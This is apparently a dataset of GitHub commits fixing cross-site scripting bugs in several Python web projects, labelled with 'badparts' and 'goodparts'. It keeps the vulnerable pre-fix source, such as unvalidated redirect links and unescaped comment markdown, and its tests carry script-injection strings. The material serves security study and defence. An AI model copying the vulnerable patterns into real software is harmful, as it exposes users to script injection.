return render(template, request, {\n    'collection': collection,\n    'query': json.dumps(query),\n    'initial': json.dumps({\n        'collections': [],\n        'layout': DEFAULT_LAYOUT,\n        'is_latest': LATEST.get(),\n        'engines': get_engines(request.user)\n    }),\n    'is_owner': collection_doc.doc.get().can_write(request.user),\n    'can_edit_index': can_edit_index(request.user),\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'mobile': is_mobile,\n  })\n\ndef index_m(request):\n  return index(request, True)\n\ndef new_search(request):\n  engine = request.GET.get('engine', 'solr')\n  collections = get_engine(request.user, engine).datasets()\n  if not collections:\n    return no_collections(request)\n\n  collection = Collection2(user=request.user, name=collections[0], engine=engine)\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  if request.GET.get('format', 'plain') == 'json':\n    return JsonResponse({\n      'collection': collection.get_props(request.user),\n      'query': query,\n      'initial': {\n          'collections': collections,\n          'layout': DEFAULT_LAYOUT,\n          'is_latest': LATEST.get(),\n          'engines': get_engines(request.user)\n       }\n     })\n  else:\n    return render('search.mako', request, {\n      'collection': collection,\n      'query': query,\n      'initial': json.dumps({\n          'collections': collections,\n          'layout': DEFAULT_LAYOUT,\n          'is_latest': LATEST.get(),\n          'engines': get_engines(request.user)\n       }),\n      'is_owner': True,\n      'is_embeddable': request.GET.get('is_embeddable', False),\n      'can_edit_index': can_edit_index(request.user)\n    })\n\ndef browse(request, name, is_mobile=False):\n  engine = request.GET.get('engine', 'solr')\n  collections = get_engine(request.user, engine).datasets()\n  if not collections and engine == 'solr':\n    return no_collections(request)\n\n  collection = Collection2(user=request.user, name=name, engine=engine)\n  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n  template = 'search.mako'\n  if is_mobile:\n    template = 'search_m.mako'\n\n  return render(template, request, {\n    'collection': collection,\n    'query': query,\n    'initial': json.dumps({\n      'autoLoad': True,\n      'collections': collections,\n      'layout': [\n          {\"size\":12,\"rows\":[{\"widgets\":[\n              {\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\",\n               \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}],\n          \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}\n      ],\n      'is_latest': LATEST.get(),\n      'engines': get_engines(request.user)\n    }),\n    'is_owner': True,\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'can_edit_index': can_edit_index(request.user),\n    'mobile': is_mobile\n  })\n\n\ndef browse_m(request, name):\n  return browse(request, name, True)\n\n\n@allow_owner_only\ndef save(request):\n  response = {'status': -1}\n\n  collection = json.loads(request.POST.get('collection', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  collection['template']['extracode'] = escape(collection['template']['extracode'])\n\n  if collection:\n    if collection['id']:\n      dashboard_doc = Document2.objects.get(id=collection['id'])\n    else:\n      dashboard_doc = Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label'])\n      Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard')\n\n    dashboard_doc.update_data({\n        'collection': collection,\n        'layout': layout\n    })\n    dashboard_doc1 = dashboard_doc.doc.get()\n    dashboard_doc.name = dashboard_doc1.name = collection['label']\n    dashboard_doc.description = dashboard_doc1.description = collection['description']\n    dashboard_doc.save()\n    dashboard_doc1.save()\n\n    response['status'] = 0\n    response['id'] = dashboard_doc.id\n    response['message'] = _('Page saved !')\n  else:\n    response['message'] = _('There is no collection to search.')\n\n  return JsonResponse(response)\n\n\ndef no_collections(request):\n  return render('no_collections.mako', request, {'is_embeddable': request.GET.get('is_embeddable', False)})\n\n\ndef admin_collections(request, is_redirect=False, is_mobile=False):\n  existing_hue_collections = DashboardController(request.user).get_search_collections()\n\n  if request.GET.get('format') == 'json':\n    collections = []\n    for collection in existing_hue_collections:\n      massaged_collection = collection.to_dict()\n      if request.GET.get('is_mobile'):\n        massaged_collection['absoluteUrl'] = reverse('search:index_m') + '?collection=%s' % collection.id\n      massaged_collection['isOwner'] = collection.doc.get().can_write(request.user)\n      collections.append(massaged_collection)\n    return JsonResponse(collections, safe=False)\n\n  template = 'admin_collections.mako'\n  if is_mobile:\n    template = 'admin_collections_m.mako'\n\n  return render(template, request, {\n    'is_embeddable': request.GET.get('is_embeddable', False),\n    'existing_hue_collections': existing_hue_collections,\n    'is_redirect': is_redirect\n  })\n\n\ndef admin_collection_delete(request):\n  if request.method != 'POST':\n    raise PopupException(_('POST request required.'))\n\n  collections = json.loads(request.POST.get('collections'))\n  searcher = DashboardController(request.user)\n  response = {\n    'result': searcher.delete_collections([collection['id'] for collection in collections])\n  }\n\n  return JsonResponse(response)\n\n\ndef admin_collection_copy(request):\n  if request.method != 'POST':\n    raise PopupException(_('POST request required.'))\n\n  collections = json.loads(request.POST.get('collections'))\n  searcher = DashboardController(request.user)\n  response = {\n    'result': searcher.copy_collections([collection['id'] for collection in collections])\n  }\n\n  return JsonResponse(response)\n"}}, "msg": "HUE-6856 [search] Protect against reflected XSS in search query parameters"}}, "https://github.com/pirati-web/socialnisystem.cz": {"1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53": {"url": "https://api.github.com/repos/pirati-web/socialnisystem.cz/commits/1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53", "html_url": "https://github.com/pirati-web/socialnisystem.cz/commit/1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53", "message": "Prevent XSS in ?back attr", "sha": "1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53", "keyword": "XSS prevent", "diff": "diff --git a/socialsystem/core/views.py b/socialsystem/core/views.py\nindex 93a4049..de40fcf 100644\n--- a/socialsystem/core/views.py\n+++ b/socialsystem/core/views.py\n@@ -1,3 +1,5 @@\n+import urllib\n+\n from django.views.generic import TemplateView, FormView, DetailView\n from django.urls import reverse\n \n@@ -64,7 +66,11 @@ class BenefitDetailView(DetailView):\n     def get_context_data(self, *args, **kwargs):\n         data = super().get_context_data(*args, **kwargs)\n \n-        if self.request.GET.get('back', None) is not None:\n-            data['back_link'] = self.request.GET['back']\n+        back = self.request.GET.get('back', None)\n+        parsed_back_url = urllib.parse.urlparse(back)\n+\n+        # We only allow blank scheme, e.g. relative urls to avoid reflected XSS\n+        if back is not None and parsed_back_url.scheme == \"\":\n+            data['back_link'] = back\n \n         return data\n", "files": {"/socialsystem/core/views.py": {"changes": [{"diff": "\n     def get_context_data(self, *args, **kwargs):\n         data = super().get_context_data(*args, **kwargs)\n \n-        if self.request.GET.get('back', None) is not None:\n-            data['back_link'] = self.request.GET['back']\n+        back = self.request.GET.get('back', None)\n+        parsed_back_url = urllib.parse.urlparse(back)\n+\n+        # We only allow blank scheme, e.g. relative urls to avoid reflected XSS\n+        if back is not None and parsed_back_url.scheme == \"\":\n+            data['back_link'] = back\n \n         return data\n", "add": 6, "remove": 2, "filename": "/socialsystem/core/views.py", "badparts": ["        if self.request.GET.get('back', None) is not None:", "            data['back_link'] = self.request.GET['back']"], "goodparts": ["        back = self.request.GET.get('back', None)", "        parsed_back_url = urllib.parse.urlparse(back)", "        if back is not None and parsed_back_url.scheme == \"\":", "            data['back_link'] = back"]}], "source": "\nfrom django.views.generic import TemplateView, FormView, DetailView from django.urls import reverse from.entryform import EntryForm, entry_form_config, build_question_flag from.models import LifeCondition, Benefit, BenefitRequirement class BenefitOverview(TemplateView): template_name='core/benefit_overview.html' def get_context_data(self): data=super().get_context_data() data['life_conditions']=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get(self, request, *args, **kwargs): form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.render_to_response(self.get_context_data()) def get_form_kwargs(self, *args, **kwargs): kwargs=super().get_form_kwargs() kwargs['entry_form_config']=entry_form_config question_ids={str(q['id']) for q in entry_form_config} data={ f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids } if data: kwargs['data']=data return kwargs def form_valid(self, form): selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str(question['id']), False) if flag: selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question))) return self.render_to_response({ 'form': form, 'submitted': True, 'claimable_benefits': Benefit.objects.find_claimable(selected_flags), }) class BenefitDetailView(DetailView): model=Benefit template_name='core/benefit_detail.html' def get_context_data(self, *args, **kwargs): data=super().get_context_data(*args, **kwargs) if self.request.GET.get('back', None) is not None: data['back_link']=self.request.GET['back'] return data ", "sourceWithComments": "from django.views.generic import TemplateView, FormView, DetailView\nfrom django.urls import reverse\n\nfrom .entryform import EntryForm, entry_form_config, build_question_flag\nfrom .models import LifeCondition, Benefit, BenefitRequirement\n\n\nclass BenefitOverview(TemplateView):\n    template_name = 'core/benefit_overview.html'\n\n    def get_context_data(self):\n        data = super().get_context_data()\n        data['life_conditions'] = LifeCondition.objects.with_benefits()\n        return data\n\n\nclass BenefitClaimView(FormView):\n    template_name = 'core/benefit_claim.html'\n    form_class = EntryForm\n\n    def get(self, request, *args, **kwargs):\n        form = self.get_form()\n\n        if form.is_valid():\n            return self.form_valid(form)\n        else:\n            return self.render_to_response(self.get_context_data())\n\n    def get_form_kwargs(self, *args, **kwargs):\n        kwargs = super().get_form_kwargs()\n        kwargs['entry_form_config'] = entry_form_config\n\n        question_ids = {str(q['id']) for q in entry_form_config}\n        data = {\n            f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids\n        }\n\n        if data:\n            kwargs['data'] = data\n\n        return kwargs\n\n    def form_valid(self, form):\n        selected_flags = []\n\n        # Assemble query\n        for question in entry_form_config:\n            flag = form.cleaned_data.get(str(question['id']), False)\n\n            if flag:\n                selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question)))\n\n        return self.render_to_response({\n            'form': form,\n            'submitted': True,\n            'claimable_benefits': Benefit.objects.find_claimable(selected_flags),\n        })\n\n\nclass BenefitDetailView(DetailView):\n    model = Benefit\n    template_name = 'core/benefit_detail.html'\n\n    def get_context_data(self, *args, **kwargs):\n        data = super().get_context_data(*args, **kwargs)\n\n        if self.request.GET.get('back', None) is not None:\n            data['back_link'] = self.request.GET['back']\n\n        return data\n"}}, "msg": "Prevent XSS in ?back attr"}}, "https://github.com/stevetasticsteve/CLA_Hub": {"a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37": {"url": "https://api.github.com/repos/stevetasticsteve/CLA_Hub/commits/a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37", "html_url": "https://github.com/stevetasticsteve/CLA_Hub/commit/a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37", "message": "Added bleach to the project to prevent XSS attacks on fields that are not escaped. Added an allowed tags setting to CE.settings. The description field now won't include <a> or <script> tags", "sha": "a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37", "keyword": "XSS prevent", "diff": "diff --git a/CE/models.py b/CE/models.py\nindex 7622ac1..5326d36 100644\n--- a/CE/models.py\n+++ b/CE/models.py\n@@ -7,6 +7,7 @@\n import CE.settings\n import sys\n import re\n+import bleach\n \n class CultureEvent(models.Model):\n     title = models.CharField(max_length=60, blank=False, unique=True)\n@@ -24,7 +25,10 @@ class CultureEvent(models.Model):\n \n     def save(self):\n         # copy the user's input from plain text to description to be processed\n-        self.description = self.description_plain_text\n+        # uses bleach to remove potentially harmful HTML code\n+        self.description = bleach.clean(str(self.description_plain_text),\n+                                        tags=CE.settings.bleach_allowed,\n+                                        strip=True)\n         if CE.settings.auto_cross_reference:\n             self.auto_cross_ref()\n         else:\ndiff --git a/CE/settings.py b/CE/settings.py\nindex 55a5723..3f7337c 100644\n--- a/CE/settings.py\n+++ b/CE/settings.py\n@@ -1,3 +1,7 @@\n-\n culture_events_shown_on_home_page = 10\n-auto_cross_reference = True\n\\ No newline at end of file\n+# If auto_cross_reference = True program will scan description field for url slugs whenever that\n+# CE is saved. If it finds a matching slug in the description it will add a hyperlink\n+# If False hyperlinks will only be added to valid slugs within curly brackets {}\n+auto_cross_reference = True\n+# A list of allowed HTML tags the user can enter to HTML escaped fields.\n+bleach_allowed = ['strong', 'p']\n\\ No newline at end of file\ndiff --git a/CE/tests.py b/CE/tests.py\nindex 53dc023..66d6334 100644\n--- a/CE/tests.py\n+++ b/CE/tests.py\n@@ -14,7 +14,6 @@\n \n # view tests\n class CEHomeViewTest(TestCase):\n-\n     def setUp(self):\n         self.total_CEs = settings.culture_events_shown_on_home_page + 1\n         for i in range(self.total_CEs):\n@@ -661,6 +660,26 @@ def test_manual_hyperlink(self):\n         self.assertIn('{reference}', ce.description_plain_text)\n         self.assertNotIn('{reference}', ce.description)\n \n+    def test_invalid_HTML_removed(self):\n+        settings.auto_cross_reference = True\n+        # create 1st CE\n+        ce = models.CultureEvent(title='First CE',\n+                                 description_plain_text='<strong>Example CE1</strong>'\n+                                                        '<a href=\"Dodgywebsite.come\">Click here</a>'\n+                                                        '<script>Nasty JS</script>')\n+        ce.save()\n+        # <script> removed\n+        self.assertIn('<script>', ce.description_plain_text)\n+        self.assertNotIn('<script>', ce.description)\n+\n+        # <a> removed\n+        self.assertIn('<a href', ce.description_plain_text)\n+        self.assertNotIn('<a href', ce.description)\n+\n+        # <strong> allowed\n+        settings.bleach_allowed = ['strong']\n+        self.assertIn('<strong>', ce.description_plain_text)\n+        self.assertIn('<strong>', ce.description)\n \n \n class TextsModelTest(TestCase):\ndiff --git a/requirements.txt b/requirements.txt\nnew file mode 100644\nindex 0000000..d4f9f61\n--- /dev/null\n+++ b/requirements.txt\n@@ -0,0 +1,10 @@\n+bleach==3.1.0\n+coverage==4.5.4\n+Django==2.2.3\n+Pillow==6.1.0\n+pytz==2019.1\n+selenium==3.141.0\n+six==1.12.0\n+sqlparse==0.3.0\n+urllib3==1.25.3\n+webencodings==0.5.1\n", "files": {"/CE/settings.py": {"changes": [{"diff": "\n-\n culture_events_shown_on_home_page = 10\n-auto_cross_reference = True\n\\ No newline at end of file\n+# If auto_cross_reference = True program will scan description field for url slugs whenever that\n+# CE is saved. If it finds a matching slug in the description it will add a hyperlink\n+# If False hyperlinks will only be added to valid slugs within curly brackets {}\n+auto_cross_reference = True\n+# A list of allowed HTML tags the user can enter to HTML escaped fields.\n+bleach_allowed = ['strong', 'p']\n\\ No newline at end of fil", "add": 6, "remove": 2, "filename": "/CE/settings.py", "badparts": ["auto_cross_reference = True"], "goodparts": ["auto_cross_reference = True", "bleach_allowed = ['strong', 'p']"]}], "source": "\n\nculture_events_shown_on_home_page=10 auto_cross_reference=True ", "sourceWithComments": "\nculture_events_shown_on_home_page = 10\nauto_cross_reference = True"}}, "msg": "Added bleach to the project to prevent XSS attacks on fields that are not escaped. Added an allowed tags setting to CE.settings. The description field now won't include <a> or <script> tags"}}, "https://github.com/dongweiming/lyanna": {"fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d": {"url": "https://api.github.com/repos/dongweiming/lyanna/commits/fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d", "html_url": "https://github.com/dongweiming/lyanna/commit/fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d", "message": "Fix comment's reflected xss vulnerability", "sha": "fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d", "keyword": "XSS fix", "diff": "diff --git a/models/comment.py b/models/comment.py\nindex 524092c..404cba5 100644\n--- a/models/comment.py\n+++ b/models/comment.py\n@@ -1,6 +1,7 @@\n import asyncio\n \n import mistune\n+import markupsafe\n from tortoise import fields\n from tortoise.query_utils import Q\n from arq import create_pool\n@@ -46,7 +47,7 @@ class Meta:\n \n     @property\n     async def html_content(self):\n-        content = await self.content\n+        content = markupsafe.escape(await self.content)\n         if not content:\n             return ''\n         return markdown(content)\n", "files": {"/models/comment.py": {"changes": [{"diff": "\n \n     @property\n     async def html_content(self):\n-        content = await self.content\n+        content = markupsafe.escape(await self.content)\n         if not content:\n             return ''\n         return markdown(content)\n", "add": 1, "remove": 1, "filename": "/models/comment.py", "badparts": ["        content = await self.content"], "goodparts": ["        content = markupsafe.escape(await self.content)"]}], "source": "\nimport asyncio import mistune from tortoise import fields from tortoise.query_utils import Q from arq import create_pool from config import REDIS_URL from.base import BaseModel from.mc import cache, clear_mc from.user import GithubUser from.consts import K_COMMENT, ONE_HOUR from.react import ReactMixin, ReactItem from.signals import comment_reacted from.utils import RedisSettings markdown=mistune.Markdown() MC_KEY_COMMENT_LIST='comment:%s:comment_list' MC_KEY_N_COMMENTS='comment:%s:n_comments' MC_KEY_COMMNET_IDS_LIKED_BY_USER='react:comment_ids_liked_by:%s:%s' class Comment(ReactMixin, BaseModel): github_id=fields.IntField() post_id=fields.IntField() ref_id=fields.IntField(default=0) kind=K_COMMENT class Meta: table='comments' async def set_content(self, content): return await self.set_props_by_key('content', content) async def save(self, *args, **kwargs): content=kwargs.pop('content', None) if content is not None: await self.set_content(content) return await super().save(*args, **kwargs) @property async def content(self): rv=await self.get_props_by_key('content') if rv: return rv.decode('utf-8') @property async def html_content(self): content=await self.content if not content: return '' return markdown(content) async def clear_mc(self): for key in(MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST): await clear_mc(key % self.post_id) @property async def user(self): return await GithubUser.get(gid=self.github_id) @property async def n_likes(self): return(await self.stats).love_count class CommentMixin: async def add_comment(self, user_id, content, ref_id=0): obj=await Comment.create(github_id=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio.gather( obj.set_content(content), redis.enqueue_job('mention_users', self.id, content, user_id), return_exceptions=True ) return obj async def del_comment(self, user_id, comment_id): c=await Comment.get(id=comment_id) if c and c.github_id==user_id and c.post_id==self.id: await c.delete() return True return False @property @cache(MC_KEY_COMMENT_LIST %('{self.id}')) async def comments(self): return await Comment.sync_filter(post_id=self.id, orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}')) async def n_comments(self): return await Comment.filter(post_id=self.id).count() @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( '{user_id}', '{self.id}'), ONE_HOUR) async def comment_ids_liked_by(self, user_id): cids=[c.id for c in await self.comments] if not cids: return[] queryset=await ReactItem.filter( Q(user_id=user_id), Q(target_id__in=cids), Q(target_kind=K_COMMENT)) return[item.target_id for item in queryset] @comment_reacted.connect async def update_comment_list_cache(_, user_id, comment_id): comment=await Comment.cache(comment_id) if comment: asyncio.gather( clear_mc(MC_KEY_COMMENT_LIST % comment.post_id), clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( user_id, comment.post_id)), return_exceptions=True ) ", "sourceWithComments": "import asyncio\n\nimport mistune\nfrom tortoise import fields\nfrom tortoise.query_utils import Q\nfrom arq import create_pool\n\nfrom config import REDIS_URL\nfrom .base import BaseModel\nfrom .mc import cache, clear_mc\nfrom .user import GithubUser\nfrom .consts import K_COMMENT, ONE_HOUR\nfrom .react import ReactMixin, ReactItem\nfrom .signals import comment_reacted\nfrom .utils import RedisSettings\n\nmarkdown = mistune.Markdown()\nMC_KEY_COMMENT_LIST = 'comment:%s:comment_list'\nMC_KEY_N_COMMENTS = 'comment:%s:n_comments'\nMC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'\n\n\nclass Comment(ReactMixin, BaseModel):\n    github_id = fields.IntField()\n    post_id = fields.IntField()\n    ref_id = fields.IntField(default=0)\n    kind = K_COMMENT\n\n    class Meta:\n        table = 'comments'\n\n    async def set_content(self, content):\n        return await self.set_props_by_key('content', content)\n\n    async def save(self, *args, **kwargs):\n        content = kwargs.pop('content', None)\n        if content is not None:\n            await self.set_content(content)\n        return await super().save(*args, **kwargs)\n\n    @property\n    async def content(self):\n        rv = await self.get_props_by_key('content')\n        if rv:\n            return rv.decode('utf-8')\n\n    @property\n    async def html_content(self):\n        content = await self.content\n        if not content:\n            return ''\n        return markdown(content)\n\n    async def clear_mc(self):\n        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):\n            await clear_mc(key % self.post_id)\n\n    @property\n    async def user(self):\n        return await GithubUser.get(gid=self.github_id)\n\n    @property\n    async def n_likes(self):\n        return (await self.stats).love_count\n\n\nclass CommentMixin:\n    async def add_comment(self, user_id, content, ref_id=0):\n        obj = await Comment.create(github_id=user_id, post_id=self.id,\n                                   ref_id=ref_id)\n        redis = await create_pool(RedisSettings.from_url(REDIS_URL))\n        await asyncio.gather(\n            obj.set_content(content),\n            redis.enqueue_job('mention_users', self.id, content, user_id),\n            return_exceptions=True\n        )\n        return obj\n\n    async def del_comment(self, user_id, comment_id):\n        c = await Comment.get(id=comment_id)\n        if c and c.github_id == user_id and c.post_id == self.id:\n            await c.delete()\n            return True\n        return False\n\n    @property\n    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))\n    async def comments(self):\n        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])\n\n    @property\n    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))\n    async def n_comments(self):\n        return await Comment.filter(post_id=self.id).count()\n\n    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n        '{user_id}', '{self.id}'), ONE_HOUR)\n    async def comment_ids_liked_by(self, user_id):\n        cids = [c.id for c in await self.comments]\n        if not cids:\n            return []\n        queryset = await ReactItem.filter(\n            Q(user_id=user_id), Q(target_id__in=cids),\n            Q(target_kind=K_COMMENT))\n        return [item.target_id for item in queryset]\n\n\n@comment_reacted.connect\nasync def update_comment_list_cache(_, user_id, comment_id):\n    comment = await Comment.cache(comment_id)\n    if comment:\n        asyncio.gather(\n            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),\n            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n                user_id, comment.post_id)),\n            return_exceptions=True\n        )\n"}}, "msg": "Fix comment's reflected xss vulnerability"}}, "https://github.com/inveniosoftware/invenio-records": {"361def20617cde5a1897c2e81b70bfadaabae608": {"url": "https://api.github.com/repos/inveniosoftware/invenio-records/commits/361def20617cde5a1897c2e81b70bfadaabae608", "html_url": "https://github.com/inveniosoftware/invenio-records/commit/361def20617cde5a1897c2e81b70bfadaabae608", "message": "admin: xss vulnerability fix\n\n* Fixes a XSS vulnerability due to improperly escaped JSON output\n  of the record.", "sha": "361def20617cde5a1897c2e81b70bfadaabae608", "keyword": "XSS fix", "diff": "diff --git a/invenio_records/admin.py b/invenio_records/admin.py\nindex 068d846..5900abf 100644\n--- a/invenio_records/admin.py\n+++ b/invenio_records/admin.py\n@@ -39,8 +39,8 @@ class RecordMetadataModelView(ModelView):\n     )\n     column_formatters = dict(\n         version_id=lambda v, c, m, p: m.version_id-1,\n-        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(\n-            json.dumps(m.json, indent=2, sort_keys=True)))\n+        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\").format(\n+            json.dumps(m.json, indent=2, sort_keys=True))\n     )\n     column_filters = ('created', 'updated', )\n     column_default_sort = ('updated', True)\ndiff --git a/tests/test_admin.py b/tests/test_admin.py\nindex dac271e..f99aff6 100644\n--- a/tests/test_admin.py\n+++ b/tests/test_admin.py\n@@ -45,7 +45,7 @@ def test_admin(app, db):\n \n     # Create a test record.\n     rec_uuid = str(uuid.uuid4())\n-    Record.create({'title': 'test'}, id_=rec_uuid)\n+    Record.create({'title': 'test<script>alert(1);</script>'}, id_=rec_uuid)\n     db.session.commit()\n \n     with app.test_request_context():\n@@ -59,6 +59,14 @@ def test_admin(app, db):\n         res = client.get(index_view_url)\n         assert res.status_code == 200\n \n+        # Check for XSS in JSON output\n+        res = client.get(detail_view_url)\n+        assert res.status_code == 200\n+        data = res.get_data(as_text=True)\n+        assert '<pre>{' in data\n+        assert '}</pre>' in data\n+        assert '<script>alert(1);</script>' not in data\n+\n         # Fake a problem with SQLAlchemy.\n         with patch('invenio_records.models.RecordMetadata') as db_mock:\n             db_mock.side_effect = SQLAlchemyError()\n", "files": {"/invenio_records/admin.py": {"changes": [{"diff": "\n     )\n     column_formatters = dict(\n         version_id=lambda v, c, m, p: m.version_id-1,\n-        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(\n-            json.dumps(m.json, indent=2, sort_keys=True)))\n+        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\").format(\n+            json.dumps(m.json, indent=2, sort_keys=True))\n     )\n     column_filters = ('created', 'updated', )\n     column_default_sort = ('updated', True)", "add": 2, "remove": 2, "filename": "/invenio_records/admin.py", "badparts": ["        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(", "            json.dumps(m.json, indent=2, sort_keys=True)))"], "goodparts": ["        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\").format(", "            json.dumps(m.json, indent=2, sort_keys=True))"]}], "source": "\n \"\"\"Admin model views for records.\"\"\" import json from flask import flash from flask_admin.contrib.sqla import ModelView from flask_babelex import gettext as _ from invenio_admin.filters import FilterConverter from invenio_db import db from markupsafe import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): \"\"\"Records admin model view.\"\"\" filter_converter=FilterConverter() can_create=False can_edit=False can_delete=True can_view_details=True column_list=('id', 'version_id', 'updated', 'created',) column_details_list=('id', 'version_id', 'updated', 'created', 'json') column_labels=dict( id=_('UUID'), version_id=_('Revision'), json=_('JSON'), ) column_formatters=dict( version_id=lambda v, c, m, p: m.version_id-1, json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True) page_size=25 def delete_model(self, model): \"\"\"Delete a record.\"\"\" try: if model.json is None: return True record=Record(model.json, model=model) record.delete() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception(e): flash(_('Failed to delete record. %(error)s', error=str(e)), category='error') db.session.rollback() return False return True record_adminview=dict( modelview=RecordMetadataModelView, model=RecordMetadata, category=_('Records')) ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2015-2018 CERN.\n#\n# Invenio is free software; you can redistribute it and/or modify it\n# under the terms of the MIT License; see LICENSE file for more details.\n\n\"\"\"Admin model views for records.\"\"\"\n\nimport json\n\nfrom flask import flash\nfrom flask_admin.contrib.sqla import ModelView\nfrom flask_babelex import gettext as _\nfrom invenio_admin.filters import FilterConverter\nfrom invenio_db import db\nfrom markupsafe import Markup\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom .api import Record\nfrom .models import RecordMetadata\n\n\nclass RecordMetadataModelView(ModelView):\n    \"\"\"Records admin model view.\"\"\"\n\n    filter_converter = FilterConverter()\n    can_create = False\n    can_edit = False\n    can_delete = True\n    can_view_details = True\n    column_list = ('id', 'version_id', 'updated', 'created',)\n    column_details_list = ('id', 'version_id', 'updated', 'created', 'json')\n    column_labels = dict(\n        id=_('UUID'),\n        version_id=_('Revision'),\n        json=_('JSON'),\n    )\n    column_formatters = dict(\n        version_id=lambda v, c, m, p: m.version_id-1,\n        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(\n            json.dumps(m.json, indent=2, sort_keys=True)))\n    )\n    column_filters = ('created', 'updated', )\n    column_default_sort = ('updated', True)\n    page_size = 25\n\n    def delete_model(self, model):\n        \"\"\"Delete a record.\"\"\"\n        try:\n            if model.json is None:\n                return True\n            record = Record(model.json, model=model)\n            record.delete()\n            db.session.commit()\n        except SQLAlchemyError as e:\n            if not self.handle_view_exception(e):\n                flash(_('Failed to delete record. %(error)s', error=str(e)),\n                      category='error')\n            db.session.rollback()\n            return False\n        return True\n\nrecord_adminview = dict(\n    modelview=RecordMetadataModelView,\n    model=RecordMetadata,\n    category=_('Records'))\n"}, "/tests/test_admin.py": {"changes": [{"diff": "\n \n     # Create a test record.\n     rec_uuid = str(uuid.uuid4())\n-    Record.create({'title': 'test'}, id_=rec_uuid)\n+    Record.create({'title': 'test<script>alert(1);</script>'}, id_=rec_uuid)\n     db.session.commit()\n \n     with app.test_request_context():\n", "add": 1, "remove": 1, "filename": "/tests/test_admin.py", "badparts": ["    Record.create({'title': 'test'}, id_=rec_uuid)"], "goodparts": ["    Record.create({'title': 'test<script>alert(1);</script>'}, id_=rec_uuid)"]}], "source": "\n \"\"\"Test admin interface.\"\"\" from __future__ import absolute_import, print_function import uuid from flask import url_for from flask_admin import Admin, menu from mock import patch from sqlalchemy.exc import SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"\"\"Test flask-admin interace.\"\"\" admin=Admin(app, name=\"Test\") assert 'model' in record_adminview assert 'modelview' in record_adminview model=record_adminview.pop('model') view=record_adminview.pop('modelview') admin.add_view(view(model, db.session, **record_adminview)) menu_items={str(item.name): item for item in admin.menu()} assert 'Records' in menu_items assert menu_items['Records'].is_category() submenu_items={ str(item.name): item for item in menu_items['Records'].get_children()} assert 'Record Metadata' in submenu_items assert isinstance(submenu_items['Record Metadata'], menu.MenuView) rec_uuid=str(uuid.uuid4()) Record.create({'title': 'test'}, id_=rec_uuid) db.session.commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for('recordmetadata.delete_view') detail_view_url=url_for( 'recordmetadata.details_view', id=rec_uuid) with app.test_client() as client: res=client.get(index_view_url) assert res.status_code==200 with patch('invenio_records.models.RecordMetadata') as db_mock: db_mock.side_effect=SQLAlchemyError() res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client.get(detail_view_url) assert res.status_code==200 assert '<pre>null</pre>' in 